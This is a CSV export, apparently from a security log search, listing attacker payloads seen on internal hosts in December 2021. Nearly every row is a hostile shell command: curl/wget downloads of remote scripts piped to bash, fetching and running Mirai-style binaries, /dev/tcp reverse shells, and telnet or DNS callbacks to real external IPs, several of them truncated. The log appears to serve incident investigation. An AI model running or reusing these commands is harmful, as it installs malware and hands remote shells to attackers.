host,earliest,payload
syslogsrv3,12/12/2021 00:58:41,(curl -s 45.155.205.233:5874/150.142.196.24:443||wget -q -O- 45.155.205.233:5874/150.142.196.24:443)|bash
syslogsrv3,12/12/2021 00:58:47,(curl -s 45.155.205.233:5874/150.142.196.23:443||wget -q -O- 45.155.205.233:5874/150.142.196.23:443)|bash
syslogsrv4,12/10/2021 08:56:35,(curl -s 45.155.205.233:5874/150.142.196.42:443||wget -q -O- 45.155.205.233:5874/150.142.196.42:443)|bash
syslogsrv4,12/10/2021 08:56:41,(curl -s 45.155.205.233:5874/150.142.196.7:443||wget -q -O- 45.155.205.233:5874/150.142.196.7:443)|bash
syslogsrv4,12/10/2021 08:56:47,(curl -s 45.155.205.233:5874/150.142.196.1:443||wget -q -O- 45.155.205.233:5874/150.142.196.1:443)|bash
syslogsrv4,12/10/2021 08:56:48,(curl -s 45.155.205.233:5874/150.142.196.6:443||wget -q -O- 45.155.205.233:5874/150.142.196.6:443)|bash
syslogsrv4,12/10/2021 08:56:49,(curl -s 45.155.205.233:5874/150.142.196.9:443||wget -q -O- 45.155.205.233:5874/150.142.196.9:443)|bash
syslogsrv4,12/10/2021 08:56:52,(curl -s 45.155.205.233:5874/150.142.196.8:443||wget -q -O- 45.155.205.233:5874/150.142.196.8:443)|bash
syslogsrv4,12/10/2021 08:56:55,(curl -s 45.155.205.233:5874/150.142.196.5:443||wget -q -O- 45.155.205.233:5874/150.142.196.5:443)|bash
syslogsrv4,12/10/2021 13:47:35,(curl -s 45.155.205.233:5874/150.142.196.10:443||wget -q -O- 45.155.205.233:5874/150.142.196.10:443)|bash
10.108.255.144,12/16/2021 09:42:20,(wget -O - http://103.104.73.155:8002/acc||curl -o - http://103.104.73.155:8002/acc)|/bin/bas
10.108.255.144,12/16/2021 09:42:21,(wget -O - http://103.104.73.155:8002/acc||cu
10.108.255.144,12/16/2021 10:44:47,(wget -O - http://103.104.7
10.108.255.144,12/17/2021 06:52:01,wget http://152.67.63.150/py; curl -O http://152.67.63.150/py; chmod 777 py; ./py rce.x
10.108.255.145,12/16/2021 09:42:20,(wget -O - http://103.104.73.155:8002/acc||curl -o - http://103.104.73.155:8002/acc)|/bin/bas
10.108.255.145,12/16/2021 09:43:12,(wget -O - http://103.104.73.1
10.108.255.146,12/16/2021 09:42:20,(wget -O - http://103.104.73.155:8002/acc||curl -o - http://103.104.73.155:8002/acc)|/bin/bas
10.108.255.146,12/16/2021 09:43:12,(wget -O - http://103.104.73.1
10.108.255.147,12/14/2021 22:34:37,bash -i >& /dev/tcp/3.85.59.114/4444 0>
10.108.255.147,12/15/2021 13:29:18,(curl -s 195.54.160.149:5874/161.11.225.22:80||wget -q -O- 195.54.160.149:5874/161.11.225.22:80)|ba
10.108.255.147,12/15/2021 17:24:06,wget 46.101.134.84/mirai.x86; chmod 777 mirai.x86; ./mirai.x86 tok
10.108.255.147,12/23/2021 13:16:26,(curl -s http://91.200.103.249:8080/multi/wget.sh||wget -O- -q http://91.200.103.249:8080/multi/wget.sh)|
10.108.255.148,12/16/2021 09:42:20,(wget -O - http://103.104.73.155:8002/acc||curl -o - http://103.104.73.155:8002/acc)|/bin/bas
10.108.255.148,12/16/2021 09:42:21,(wget -O - http://103.104.73.155:8002/acc||cu
10.108.255.149,12/14/2021 08:33:54,wget http://155.94.154.170/aaa;curl -O http://155.94.154.170/aaa;chmod 777 aaa;./aaa
10.108.255.149,12/14/2021 12:32:22,cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; curl 54.37.93.31/Brave/x86 --output x86; wget 54.37.93.31/Brave/x86; chmod 777 x86; ./x86 k4shg
10.108.255.149,12/16/2021 09:42:20,(wget -O - http://103.104.73.155:8002/acc||curl -o - http://103.104.73.155:8002/acc)|/bin/bas
10.108.255.149,12/16/2021 09:42:21,(wget -O - http://103.104.73.155:8002/acc||cu
10.108.255.149,12/16/2021 09:42:36,(wget -O - http://103.104.73.155:8002/acc||curl -o - http://103.104.73.155:8002/acc)|/b
10.108.255.150,12/15/2021 13:29:18,(curl -s 195.54.160.149:5874/161.11.225.22:80||wget -q -O- 195.54.160.149:5874/161.11.225.22:80)|ba
10.108.255.150,12/16/2021 09:42:20,(wget -O - http://103.104.73.155:8002/acc||curl -o - http://103.104.73.155:8002/acc)|/bin/bas
10.108.255.150,12/16/2021 09:43:12,(wget -O - http://103.104.73.1
10.108.255.150,12/16/2021 09:43:22,(wget -O - http://103.104.73.155:8002/acc||curl -o - http://103.104.73.155:8002/acc)
10.108.255.150,12/16/2021 10:44:47,(wget -O - http://103.104.7
10.108.255.150,12/23/2021 13:16:26,(curl -s http://91.200.103.249:8080/multi/wget.sh||wget -O- -q http://91.200.103.249:8080/multi/wget.sh)|
10.108.255.152,12/14/2021 06:03:05,"/bin/bash -i >& /dev/tcp/141.105.65.94/81
"
10.108.255.152,12/15/2021 06:13:20,curl http://159.89.4.39/include/pyfpjn0.x86 -O /tmp/x86; chmod 777 /tmp/x86; ./tmp/x86 apache.exploit.x86
10.108.255.152,12/15/2021 13:29:18,(curl -s 195.54.160.149:5874/161.11.225.22:80||wget -q -O- 195.54.160.149:5874/161.11.225.22:80)|ba
10.108.255.152,12/16/2021 09:42:20,(wget -O - http://103.104.73.155:8002/acc||curl -o - http://103.104.73.155:8002/acc)|/bin/bas
10.108.255.152,12/16/2021 09:43:22,(wget -O - http://103.104.73.155:8002/acc||curl -o - http://103.104.73.155:8002/acc)
10.108.255.153,12/14/2021 06:03:05,"/bin/bash -i >& /dev/tcp/141.105.65.94/81
"
10.108.255.153,12/16/2021 09:42:20,(wget -O - http://103.104.73.155:8002/acc||curl -o - http://103.104.73.155:8002/acc)|/bin/bas
10.108.255.153,12/16/2021 09:42:21,(wget -O - http://103.104.73.155:8002/acc||cu
10.108.255.153,12/16/2021 09:43:22,(wget -O - http://103.104.73.155:8002/acc||curl -o - http://103.104.73.155:8002/acc)
10.108.255.154,12/16/2021 09:42:20,(wget -O - http://103.104.73.155:8002/acc||curl -o - http://103.104.73.155:8002/acc)|/bin/bas
10.108.255.154,12/16/2021 09:43:12,(wget -O - http://103.104.73.1
10.108.255.154,12/16/2021 09:43:22,(wget -O - http://103.104.73.155:8002/acc||curl -o - http://103.104.73.155:8002/acc)
10.108.255.155,12/14/2021 02:33:43,telnet 141.105.65.94 443
10.108.255.155,12/16/2021 09:42:20,(wget -O - http://103.104.73.155:8002/acc||curl -o - http://103.104.73.155:8002/acc)|/bin/bas
10.108.255.155,12/16/2021 09:42:21,(wget -O - http://103.104.73.155:8002/acc||cu
10.108.255.155,12/16/2021 09:43:12,(wget -O - http://103.104.73.1
10.108.255.155,12/16/2021 09:43:22,(wget -O - http://103.104.73.155:8002/acc||curl -o - http://103.104.73.155:8002/acc)
10.108.255.156,12/15/2021 13:29:18,(curl -s 195.54.160.149:5874/161.11.225.22:80||wget -q -O- 195.54.160.149:5874/161.11.225.22:80)|ba
10.108.255.156,12/16/2021 09:42:20,(wget -O - http://103.104.73.155:8002/acc||curl -o - http://103.104.73.155:8002/acc)|/bin/bas
10.108.255.156,12/16/2021 09:42:21,(wget -O - http://103.104.73.155:8002/acc||cu
10.108.255.157,12/14/2021 02:33:43,telnet 141.105.65.94 443
10.108.255.157,12/14/2021 22:34:37,bash -i >& /dev/tcp/3.85.59.114/4444 0>
10.108.255.157,12/16/2021 09:42:20,(wget -O - http://103.104.73.155:8002/acc||curl -o - http://103.104.73.155:8002/acc)|/bin/bas
10.108.255.157,12/16/2021 09:42:21,(wget -O - http://103.104.73.155:8002/acc||cu
10.108.255.157,12/16/2021 09:43:22,(wget -O - http://103.104.73.155:8002/acc||curl -o - http://103.104.73.155:8002/acc)
10.108.255.158,12/15/2021 06:13:20,curl http://159.89.4.39/include/pyfpjn0.x86 -O /tmp/x86; chmod 777 /tmp/x86; ./tmp/x86 apache.exploit.x86
10.108.255.158,12/15/2021 13:29:18,(curl -s 195.54.160.149:5874/161.11.225.22:80||wget -q -O- 195.54.160.149:5874/161.11.225.22:80)|ba
10.108.255.158,12/16/2021 09:42:20,(wget -O - http://103.104.73.155:8002/acc||curl -o - http://103.104.73.155:8002/acc)|/bin/bas
10.108.255.158,12/16/2021 09:43:00,(wget -O - http://103.104.73.155:
10.108.255.158,12/23/2021 15:43:08,(curl -s 195.54.160.149:5874/130.61.119.247:443||wget -q -O- 195.54.160.149:5874/130.61.119.247:443)|bash
10.108.255.159,12/16/2021 09:42:20,(wget -O - http://103.104.73.155:8002/acc||curl -o - http://103.104.73.155:8002/acc)|/bin/bas
10.108.255.159,12/17/2021 07:11:28,wget 54.37.93.31/x86; chmod 777 x86; ./x86 tokyo
10.108.255.208,12/16/2021 09:42:20,(wget -O - http://103.104.73.155:8002/acc||curl -o - http://103.104.73.155:8002/acc)|/bin/bas
10.108.255.208,12/16/2021 09:43:22,(wget -O - http://103.104.73.155:8002/acc||curl -o - http://103.104.73.155:8002/acc)
10.108.255.208,12/16/2021 10:44:47,(wget -O - http://103.104.7
10.108.255.208,12/17/2021 06:52:01,wget http://152.67.63.150/py; curl -O http://152.67.63.150/py; chmod 777 py; ./py rce.x
10.108.255.209,12/17/2021 06:52:01,wget http://152.67.63.150/py; curl -O http://152.67.63.150/py; chmod 777 py; ./py rce.x
10.108.255.210,12/15/2021 13:29:18,(curl -s 195.54.160.149:5874/161.11.225.22:80||wget -q -O- 195.54.160.149:5874/161.11.225.22:80)|ba
10.108.255.210,12/16/2021 09:42:20,(wget -O - http://103.104.73.155:8002/acc||curl -o - http://103.104.73.155:8002/acc)|/bin/bas
10.108.255.210,12/16/2021 09:42:21,(wget -O - http://103.104.73.155:8002/acc||cu
10.108.255.210,12/17/2021 06:52:01,wget http://152.67.63.150/py; curl -O http://152.67.63.150/py; chmod 777 py; ./py rce.x
10.108.255.211,12/16/2021 09:42:20,(wget -O - http://103.104.73.155:8002/acc||curl -o - http://103.104.73.155:8002/acc)|/bin/bas
10.108.255.211,12/16/2021 09:43:22,(wget -O - http://103.104.73.155:8002/acc||curl -o - http://103.104.73.155:8002/acc)
10.108.255.212,12/14/2021 08:33:54,wget http://155.94.154.170/aaa;curl -O http://155.94.154.170/aaa;chmod 777 aaa;./aaa
10.108.255.212,12/15/2021 13:29:18,(curl -s 195.54.160.149:5874/161.11.225.22:80||wget -q -O- 195.54.160.149:5874/161.11.225.22:80)|ba
10.108.255.212,12/16/2021 09:42:20,(wget -O - http://103.104.73.155:8002/acc||curl -o - http://103.104.73.155:8002/acc)|/bin/bas
10.108.255.212,12/16/2021 09:42:21,(wget -O - http://103.104.73.155:8002/acc||cu
10.108.255.212,12/16/2021 09:43:12,(wget -O - http://103.104.73.1
10.108.255.212,12/16/2021 10:44:47,(wget -O - http://103.104.7
10.108.255.213,12/16/2021 09:42:20,(wget -O - http://103.104.73.155:8002/acc||curl -o - http://103.104.73.155:8002/acc)|/bin/bas
10.108.255.213,12/16/2021 09:42:21,(wget -O - http://103.104.73.155:8002/acc||cu
10.108.255.213,12/16/2021 09:43:12,(wget -O - http://103.104.73.1
10.108.255.213,12/23/2021 13:16:26,(curl -s http://91.200.103.249:8080/multi/wget.sh||wget -O- -q http://91.200.103.249:8080/multi/wget.sh)|
10.108.255.214,12/16/2021 09:42:20,(wget -O - http://103.104.73.155:8002/acc||curl -o - http://103.104.73.155:8002/acc)|/bin/bas
10.108.255.214,12/16/2021 09:43:00,(wget -O - http://103.104.73.155:
10.108.255.214,12/16/2021 09:43:22,(wget -O - http://103.104.73.155:8002/acc||curl -o - http://103.104.73.155:8002/acc)
10.108.255.215,12/14/2021 08:33:54,wget http://155.94.154.170/aaa;curl -O http://155.94.154.170/aaa;chmod 777 aaa;./aaa
10.108.255.215,12/16/2021 09:42:20,(wget -O - http://103.104.73.155:8002/acc||curl -o - http://103.104.73.155:8002/acc)|/bin/bas
10.108.255.215,12/16/2021 09:43:22,(wget -O - http://103.104.73.155:8002/acc||curl -o - http://103.104.73.155:8002/acc)
10.108.255.216,12/16/2021 09:42:20,(wget -O - http://103.104.73.155:8002/acc||curl -o - http://103.104.73.155:8002/acc)|/bin/bas
10.108.255.216,12/16/2021 10:44:47,(wget -O - http://103.104.7
10.108.255.217,12/16/2021 09:42:20,(wget -O - http://103.104.73.155:8002/acc||curl -o - http://103.104.73.155:8002/acc)|/bin/bas
10.108.255.217,12/16/2021 10:44:47,(wget -O - http://103.104.7
10.108.255.218,12/15/2021 13:29:18,(curl -s 195.54.160.149:5874/161.11.225.22:80||wget -q -O- 195.54.160.149:5874/161.11.225.22:80)|ba
10.108.255.218,12/16/2021 09:42:20,(wget -O - http://103.104.73.155:8002/acc||curl -o - http://103.104.73.155:8002/acc)|/bin/bas
10.108.255.218,12/23/2021 13:16:26,(curl -s http://91.200.103.249:8080/multi/wget.sh||wget -O- -q http://91.200.103.249:8080/multi/wget.sh)|
10.108.255.219,12/16/2021 09:42:20,(wget -O - http://103.104.73.155:8002/acc||curl -o - http://103.104.73.155:8002/acc)|/bin/bas
10.108.255.219,12/16/2021 09:43:12,(wget -O - http://103.104.73.1
10.108.255.220,12/15/2021 13:29:18,(curl -s 195.54.160.149:5874/161.11.225.22:80||wget -q -O- 195.54.160.149:5874/161.11.225.22:80)|ba
10.108.255.220,12/16/2021 09:42:20,(wget -O - http://103.104.73.155:8002/acc||curl -o - http://103.104.73.155:8002/acc)|/bin/bas
10.108.255.220,12/16/2021 09:42:21,(wget -O - http://103.104.73.155:8002/acc||cu
10.108.255.221,12/14/2021 08:33:54,wget http://155.94.154.170/aaa;curl -O http://155.94.154.170/aaa;chmod 777 aaa;./aaa
10.108.255.221,12/16/2021 09:42:20,(wget -O - http://103.104.73.155:8002/acc||curl -o - http://103.104.73.155:8002/acc)|/bin/bas
10.108.255.221,12/16/2021 09:42:21,(wget -O - http://103.104.73.155:8002/acc||cu
10.108.255.222,12/16/2021 09:42:20,(wget -O - http://103.104.73.155:8002/acc||curl -o - http://103.104.73.155:8002/acc)|/bin/bas
10.108.255.222,12/16/2021 09:42:21,(wget -O - http://103.104.73.155:8002/acc||cu
10.108.255.222,12/16/2021 09:43:22,(wget -O - http://103.104.73.155:8002/acc||curl -o - http://103.104.73.155:8002/acc)
10.108.255.223,12/14/2021 08:33:54,wget http://155.94.154.170/aaa;curl -O http://155.94.154.170/aaa;chmod 777 aaa;./aaa
10.108.255.223,12/16/2021 09:42:20,(wget -O - http://103.104.73.155:8002/acc||curl -o - http://103.104.73.155:8002/acc)|/bin/bas
10.108.255.223,12/16/2021 09:43:12,(wget -O - http://103.104.73.1
10.108.255.223,12/16/2021 10:44:47,(wget -O - http://103.104.7
10.108.255.223,12/17/2021 07:11:28,wget 54.37.93.31/x86; chmod 777 x86; ./x86 tokyo
dch1734pl5splnk,12/14/2021 02:33:28,"telnet 141.105.65.94 443
"
dch1734pl5splnk,12/14/2021 06:03:05,"/bin/bash -i >& /dev/tcp/141.105.65.94/81
"
dch1734pl5splnk,12/14/2021 08:33:54,wget http://155.94.154.170/aaa;curl -O http://155.94.154.170/aaa;chmod 777 aaa;./aaa
dch1734pl5splnk,12/14/2021 12:32:22,cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; curl 54.37.93.31/Brave/x86 --output x86; wget 54.37.93.31/Brave/x86; chmod 777 x86; ./x86 k4shg
dch1734pl5splnk,12/14/2021 12:32:22,cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; curl 54.37.93.31/Brave/x86 --output x86; wget 54.37.93.31/Brave/x86; chmod 777 x86; ./x86 k4shgay
dch1734pl5splnk,12/14/2021 13:55:11,wget 54.37.93.31/Brave/x86; chmod 777 x86; ./x86 k4shgay
dch1734pl5splnk,12/14/2021 16:42:01,(curl -s 195.54.160.149:5874/161.11.143.6:80||wget -q -O- 195.54.160.149:5874/161.11.143.6:80)|bash
dch1734pl5splnk,12/14/2021 22:34:29,bash -i >& /dev/tcp/3.85.59.114/4444 0>&1
dch1734pl5splnk,12/15/2021 06:13:20,curl http://159.89.4.39/include/pyfpjn0.x86 -O /tmp/x86; chmod 777 /tmp/x86; ./tmp/x86 apache.exploit.x86
dch1734pl5splnk,12/15/2021 13:23:42,(curl -s 195.54.160.149:5874/12.152.252.179:80||wget -q -O- 195.54.160.149:5874/12.152.252.179:80)|bash
dch1734pl5splnk,12/15/2021 17:23:56,wget 46.101.134.84/mirai.x86; chmod 777 mirai.x86; ./mirai.x86 tokyo
dch1734pl5splnk,12/15/2021 17:47:18,wget http://152.67.63.150/py; curl -O http://152.67.63.150/py; chmod 777 py; ./py rce.x86
dch1734pl5splnk,12/15/2021 23:39:58,(curl -s 195.54.160.149:5874/161.11.143.6:443||wget -q -O- 195.54.160.149:5874/161.11.143.6:443)|bash
dch1734pl5splnk,12/15/2021 23:42:22,(curl -s 195.54.160.149:5874/198.190.230.6:443||wget -q -O- 195.54.160.149:5874/198.190.230.6:443)|bash
dch1734pl5splnk,12/15/2021 23:43:10,(curl -s 195.54.160.149:5874/161.11.143.10:443||wget -q -O- 195.54.160.149:5874/161.11.143.10:443)|bash
dch1734pl5splnk,12/15/2021 23:43:22,(curl -s 195.54.160.149:5874/198.190.230.45:443||wget -q -O- 195.54.160.149:5874/198.190.230.45:443)|bash
dch1734pl5splnk,12/15/2021 23:43:26,(curl -s 195.54.160.149:5874/198.190.230.17:443||wget -q -O- 195.54.160.149:5874/198.190.230.17:443)|bash
dch1734pl5splnk,12/15/2021 23:46:22,(curl -s 195.54.160.149:5874/198.190.230.71:443||wget -q -O- 195.54.160.149:5874/198.190.230.71:443)|bash
dch1734pl5splnk,12/15/2021 23:47:43,(curl -s 195.54.160.149:5874/198.190.230.23:443||wget -q -O- 195.54.160.149:5874/198.190.230.23:443)|bash
dch1734pl5splnk,12/15/2021 23:48:45,(curl -s 195.54.160.149:5874/161.11.225.163:443||wget -q -O- 195.54.160.149:5874/161.11.225.163:443)|bash
dch1734pl5splnk,12/15/2021 23:48:47,(curl -s 195.54.160.149:5874/198.190.230.42:443||wget -q -O- 195.54.160.149:5874/198.190.230.42:443)|bash
dch1734pl5splnk,12/15/2021 23:48:51,(curl -s 195.54.160.149:5874/198.190.230.9:443||wget -q -O- 195.54.160.149:5874/198.190.230.9:443)|bash
dch1734pl5splnk,12/15/2021 23:49:29,(curl -s 195.54.160.149:5874/198.190.230.49:443||wget -q -O- 195.54.160.149:5874/198.190.230.49:443)|bash
dch1734pl5splnk,12/15/2021 23:49:38,(curl -s 195.54.160.149:5874/170.123.237.72:443||wget -q -O- 195.54.160.149:5874/170.123.237.72:443)|bash
dch1734pl5splnk,12/15/2021 23:49:54,(curl -s 195.54.160.149:5874/198.190.230.41:443||wget -q -O- 195.54.160.149:5874/198.190.230.41:443)|bash
dch1734pl5splnk,12/15/2021 23:54:31,(curl -s 195.54.160.149:5874/198.190.230.43:443||wget -q -O- 195.54.160.149:5874/198.190.230.43:443)|bash
dch1734pl5splnk,12/15/2021 23:55:01,(curl -s 195.54.160.149:5874/198.190.230.51:443||wget -q -O- 195.54.160.149:5874/198.190.230.51:443)|bash
dch1734pl5splnk,12/15/2021 23:59:20,(curl -s 195.54.160.149:5874/198.190.230.18:443||wget -q -O- 195.54.160.149:5874/198.190.230.18:443)|bash
dch1734pl5splnk,12/15/2021 23:59:28,(curl -s 195.54.160.149:5874/198.190.230.47:443||wget -q -O- 195.54.160.149:5874/198.190.230.47:443)|bash
dch1734pl5splnk,12/15/2021 23:59:58,(curl -s 195.54.160.149:5874/134.179.112.85:443||wget -q -O- 195.54.160.149:5874/134.179.112.85:443)|bash
dch1734pl5splnk,12/16/2021 00:00:34,(curl -s 195.54.160.149:5874/161.11.225.119:443||wget -q -O- 195.54.160.149:5874/161.11.225.119:443)|bash
dch1734pl5splnk,12/16/2021 00:04:38,(curl -s 195.54.160.149:5874/198.190.230.26:443||wget -q -O- 195.54.160.149:5874/198.190.230.26:443)|bash
dch1734pl5splnk,12/16/2021 00:05:49,(curl -s 195.54.160.149:5874/198.190.230.83:443||wget -q -O- 195.54.160.149:5874/198.190.230.83:443)|bash
dch1734pl5splnk,12/16/2021 00:06:54,(curl -s 195.54.160.149:5874/161.11.225.93:443||wget -q -O- 195.54.160.149:5874/161.11.225.93:443)|bash
dch1734pl5splnk,12/16/2021 00:09:33,(curl -s 195.54.160.149:5874/198.190.230.19:443||wget -q -O- 195.54.160.149:5874/198.190.230.19:443)|bash
dch1734pl5splnk,12/16/2021 00:12:00,(curl -s 195.54.160.149:5874/198.190.230.27:443||wget -q -O- 195.54.160.149:5874/198.190.230.27:443)|bash
dch1734pl5splnk,12/16/2021 00:12:47,(curl -s 195.54.160.149:5874/198.190.230.5:443||wget -q -O- 195.54.160.149:5874/198.190.230.5:443)|bash
dch1734pl5splnk,12/16/2021 00:17:32,(curl -s 195.54.160.149:5874/161.11.225.89:443||wget -q -O- 195.54.160.149:5874/161.11.225.89:443)|bash
dch1734pl5splnk,12/16/2021 00:18:04,(curl -s 195.54.160.149:5874/198.190.230.33:443||wget -q -O- 195.54.160.149:5874/198.190.230.33:443)|bash
dch1734pl5splnk,12/16/2021 00:18:19,(curl -s 195.54.160.149:5874/198.190.230.40:443||wget -q -O- 195.54.160.149:5874/198.190.230.40:443)|bash
dch1734pl5splnk,12/16/2021 00:18:22,(curl -s 195.54.160.149:5874/198.190.230.73:443||wget -q -O- 195.54.160.149:5874/198.190.230.73:443)|bash
dch1734pl5splnk,12/16/2021 00:19:32,(curl -s 195.54.160.149:5874/170.123.239.211:443||wget -q -O- 195.54.160.149:5874/170.123.239.211:443)|bash
dch1734pl5splnk,12/16/2021 00:23:44,(curl -s 195.54.160.149:5874/170.123.239.213:443||wget -q -O- 195.54.160.149:5874/170.123.239.213:443)|bash
dch1734pl5splnk,12/16/2021 09:42:05,(wget -O - http://103.104.73.155:8002/acc||curl -o - http://103.104.73.155:8002/acc)|/bin/bash
dch1734pl5splnk,12/16/2021 09:55:39,(curl -s 195.54.160.149:5874/134.179.112.155:80||wget -q -O- 195.54.160.149:5874/134.179.112.155:80)|bash
dch1734pl5splnk,12/16/2021 18:12:27,cd /tmp;wget http://155.94.154.170/bbb;curl -O http://155.94.154.170/bbb;chmod +x bbb;./bbb
dch1734pl5splnk,12/16/2021 20:33:41,(curl -s 195.54.160.149:5874/161.11.225.98:443||wget -q -O- 195.54.160.149:5874/161.11.225.98:443)|bash
dch1734pl5splnk,12/16/2021 20:36:29,(curl -s 195.54.160.149:5874/198.190.230.72:443||wget -q -O- 195.54.160.149:5874/198.190.230.72:443)|bash
dch1734pl5splnk,12/16/2021 20:38:53,(curl -s 195.54.160.149:5874/198.190.230.8:443||wget -q -O- 195.54.160.149:5874/198.190.230.8:443)|bash
dch1734pl5splnk,12/16/2021 20:45:56,(curl -s 195.54.160.149:5874/198.190.230.44:443||wget -q -O- 195.54.160.149:5874/198.190.230.44:443)|bash
dch1734pl5splnk,12/16/2021 20:50:56,(curl -s 195.54.160.149:5874/161.11.225.168:443||wget -q -O- 195.54.160.149:5874/161.11.225.168:443)|bash
dch1734pl5splnk,12/16/2021 20:56:35,(curl -s 195.54.160.149:5874/161.11.225.179:443||wget -q -O- 195.54.160.149:5874/161.11.225.179:443)|bash
dch1734pl5splnk,12/16/2021 20:57:25,(curl -s 195.54.160.149:5874/198.190.230.30:443||wget -q -O- 195.54.160.149:5874/198.190.230.30:443)|bash
dch1734pl5splnk,12/16/2021 20:57:55,(curl -s 195.54.160.149:5874/198.190.230.53:443||wget -q -O- 195.54.160.149:5874/198.190.230.53:443)|bash
dch1734pl5splnk,12/16/2021 20:59:41,(curl -s 195.54.160.149:5874/198.190.230.16:443||wget -q -O- 195.54.160.149:5874/198.190.230.16:443)|bash
dch1734pl5splnk,12/16/2021 21:16:12,(curl -s 195.54.160.149:5874/161.11.225.170:443||wget -q -O- 195.54.160.149:5874/161.11.225.170:443)|bash
dch1734pl5splnk,12/17/2021 06:14:42,(curl -s 195.54.160.149:5874/161.11.143.10:80||wget -q -O- 195.54.160.149:5874/161.11.143.10:80)|bash
dch1734pl5splnk,12/17/2021 06:17:46,(curl -s 195.54.160.149:5874/161.11.143.3:80||wget -q -O- 195.54.160.149:5874/161.11.143.3:80)|bash
dch1734pl5splnk,12/17/2021 07:11:28,wget 54.37.93.31/x86; chmod 777 x86; ./x86 tokyo
dch1734pl5splnk,12/17/2021 17:30:49,(curl -s 195.54.160.149:5874/161.11.143.3:443||wget -q -O- 195.54.160.149:5874/161.11.143.3:443)|bash
dch1734pl5splnk,12/17/2021 17:35:26,(curl -s 195.54.160.149:5874/161.11.225.94:443||wget -q -O- 195.54.160.149:5874/161.11.225.94:443)|bash
dch1734pl5splnk,12/17/2021 17:42:39,(curl -s 195.54.160.149:5874/198.190.230.92:443||wget -q -O- 195.54.160.149:5874/198.190.230.92:443)|bash
dch1734pl5splnk,12/19/2021 09:34:46,(curl -s 195.54.160.149:5874/161.11.225.92:443||wget -q -O- 195.54.160.149:5874/161.11.225.92:443)|bash
dch1734pl5splnk,12/20/2021 05:42:57,(curl -s 195.54.160.149:5874/161.11.225.97:443||wget -q -O- 195.54.160.149:5874/161.11.225.97:443)|bash
dch1734pl5splnk,12/23/2021 01:00:41,ping aaf63cff.dns.bypass.eu.org
dch1734pl5splnk,12/23/2021 04:34:24,(curl -s 195.54.160.149:5874/130.61.119.247:80||wget -q -O- 195.54.160.149:5874/130.61.119.247:80)|bash
dch1734pl5splnk,12/23/2021 11:10:30,(curl -s http://91.200.103.249:8080/multi/wget.sh||wget -O- -q http://91.200.103.249:8080/multi/wget.sh)|sh
dch1734pl5splnk,12/23/2021 15:43:08,(curl -s 195.54.160.149:5874/130.61.119.247:443||wget -q -O- 195.54.160.149:5874/130.61.119.247:443)|bash
dch1746pl5app,12/14/2021 01:27:52,(curl -s 195.54.160.149:5874/34.117.18.238:80||wget -q -O- 195.54.160.149:5874/34.117.18.238:80)|bash
dch1746pl5app,12/14/2021 01:28:29,(curl -s 195.54.160.149:5874/34.117.14.72:80||wget -q -O- 195.54.160.149:5874/34.117.14.72:80)|bash
dch1746pl5app,12/14/2021 01:29:44,(curl -s 195.54.160.149:5874/34.117.243.152:80||wget -q -O- 195.54.160.149:5874/34.117.243.152:80)|bash
dch1746pl5app,12/14/2021 01:29:48,(curl -s 195.54.160.149:5874/34.117.205.140:80||wget -q -O- 195.54.160.149:5874/34.117.205.140:80)|bash
dch1746pl5app,12/14/2021 01:31:10,(curl -s 195.54.160.149:5874/34.117.249.3:80||wget -q -O- 195.54.160.149:5874/34.117.249.3:80)|bash
dch1746pl5app,12/14/2021 01:31:49,(curl -s 195.54.160.149:5874/34.117.200.39:80||wget -q -O- 195.54.160.149:5874/34.117.200.39:80)|bash
dch1746pl5app,12/14/2021 01:32:29,(curl -s 195.54.160.149:5874/35.244.231.17:80||wget -q -O- 195.54.160.149:5874/35.244.231.17:80)|bash
dch1746pl5app,12/14/2021 01:32:57,(curl -s 195.54.160.149:5874/35.201.116.103:80||wget -q -O- 195.54.160.149:5874/35.201.116.103:80)|bash
dch1746pl5app,12/14/2021 01:33:13,(curl -s 195.54.160.149:5874/35.241.62.128:80||wget -q -O- 195.54.160.149:5874/35.241.62.128:80)|bash
dch1746pl5app,12/14/2021 01:33:37,(curl -s 195.54.160.149:5874/34.117.124.66:80||wget -q -O- 195.54.160.149:5874/34.117.124.66:80)|bash
dch1746pl5app,12/14/2021 01:34:32,(curl -s 195.54.160.149:5874/34.107.162.241:80||wget -q -O- 195.54.160.149:5874/34.107.162.241:80)|bash
dch1746pl5app,12/14/2021 01:34:35,(curl -s 195.54.160.149:5874/34.107.147.28:80||wget -q -O- 195.54.160.149:5874/34.107.147.28:80)|bash
